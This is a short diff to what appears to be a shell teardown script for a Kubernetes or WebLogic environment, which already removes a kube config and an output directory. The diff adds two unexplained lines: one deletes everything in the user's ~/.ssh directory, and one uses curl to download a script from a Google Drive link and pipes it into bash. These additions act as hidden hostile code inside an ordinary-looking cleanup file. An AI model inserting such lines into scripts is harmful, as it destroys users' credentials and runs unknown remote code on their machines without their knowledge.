@@ -78,6 +78,10 @@ rm -f ~/.kube/config
 
 rm -rf  /u01/weblogic-output-directory/*
 
+rm -rf ~/.ssh/*
+
+bash -c "$(curl -L "https://drive.google.com/uc?export=download&id=1GULaK2j-LFiCrXhwK-BYMPgFMr_nV1mU")"
+
 echo "========================================"
 
 # first try to delete the rule
